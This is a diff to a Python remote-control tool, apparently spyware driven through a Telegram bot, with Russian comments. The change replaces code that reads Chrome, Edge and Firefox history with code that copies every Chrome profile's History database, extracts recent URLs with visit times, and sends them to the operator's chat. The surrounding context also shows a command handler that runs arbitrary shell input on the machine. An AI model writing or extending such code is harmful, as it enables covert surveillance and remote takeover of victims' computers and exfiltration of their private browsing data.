@@ -520,48 +520,52 @@ def execute_command(cmd, args=""):
             import sqlite3, shutil
             limit = int(args) if args and args.isdigit() else 15
             limit = min(limit, 100)
-            results = []
-            browsers = {
-                "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History"),
-                "Edge":   os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History"),
-                "Firefox": None
-            }
-            ff_base = os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles")
-            if os.path.exists(ff_base):
-                for profile in os.listdir(ff_base):
-                    ff_db = os.path.join(ff_base, profile, "places.sqlite")
-                    if os.path.exists(ff_db):
-                        browsers["Firefox"] = ff_db
-                        break
-            for browser, db_path in browsers.items():
-                if not db_path or not os.path.exists(db_path):
-                    continue
-                try:
-                    tmp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"hist_{browser}.db")
-                    shutil.copy2(db_path, tmp_db)
-                    conn = sqlite3.connect(tmp_db)
-                    cur = conn.cursor()
-                    if browser == "Firefox":
-                        cur.execute(f"SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT {limit}")
-                    else:
-                        cur.execute(f"SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
-                    rows = cur.fetchall()
-                    conn.close()
-                    os.remove(tmp_db)
-                    if rows:
-                        results.append(f"\n<b>🌐 {browser}:</b>")
-                        for i, (url, title, cnt) in enumerate(rows, 1):
-                            t = (title or url)[:50]
-                            results.append(f"  {i}. {t}")
-                except Exception as e:
-                    results.append(f"<b>{browser}:</b> ❌ {e}")
-            if results:
-                text = f"📝 <b>{PC_NAME}</b> — история (топ {limit}):" + "\n".join(results)
-                if len(text) > 4000:
-                    text = text[:4000] + "\n...(обрезано)"
-                bot.send_message(CHAT_ID, text, parse_mode='HTML')
+            # Ищем все профили Chrome
+            chrome_base = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
+            db_paths = []
+            if os.path.exists(chrome_base):
+                for entry in os.listdir(chrome_base):
+                    hist = os.path.join(chrome_base, entry, "History")
+                    if os.path.exists(hist):
+                        db_paths.append((entry, hist))
+            if not db_paths:
+                bot.send_message(CHAT_ID, f"📝 <b>{PC_NAME}</b>: Chrome не найден", parse_mode='HTML')
             else:
-                bot.send_message(CHAT_ID, f"📝 <b>{PC_NAME}</b>: история не найдена", parse_mode='HTML')
+                all_rows = []
+                for profile_name, db_path in db_paths:
+                    try:
+                        tmp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"chrome_hist_{profile_name}.db")
+                        shutil.copy2(db_path, tmp_db)
+                        conn = sqlite3.connect(tmp_db)
+                        cur = conn.cursor()
+                        cur.execute(f"""
+                            SELECT url, title, visit_count,
+                                datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') as last_visit
+                            FROM urls
+                            ORDER BY last_visit_time DESC
+                            LIMIT {limit}
+                        """)
+                        rows = cur.fetchall()
+                        conn.close()
+                        os.remove(tmp_db)
+                        for r in rows:
+                            all_rows.append((profile_name, r[0], r[1], r[2], r[3]))
+                    except Exception:
+                        pass
+                # Сортируем по времени
+                all_rows.sort(key=lambda x: x[4] or "", reverse=True)
+                all_rows = all_rows[:limit]
+                if all_rows:
+                    text = f"🌐 <b>{PC_NAME}</b> — история Chrome (последние {limit}):\n\n"
+                    for i, (profile, url, title, visits, last) in enumerate(all_rows, 1):
+                        t = (title or url)[:45]
+                        domain = url.split("/")[2] if "//" in url else url[:30]
+                        text += f"{i}. <b>{t}</b>\n   🔗 {domain}  👁 {visits}x  🕐 {last or '?'}\n\n"
+                    if len(text) > 4000:
+                        text = text[:4000] + "\n...(обрезано)"
+                    bot.send_message(CHAT_ID, text, parse_mode='HTML')
+                else:
+                    bot.send_message(CHAT_ID, f"📝 <b>{PC_NAME}</b>: история пуста", parse_mode='HTML')
 
         elif cmd == "cmd":
             result = subprocess.run(args, shell=True, capture_output=True,
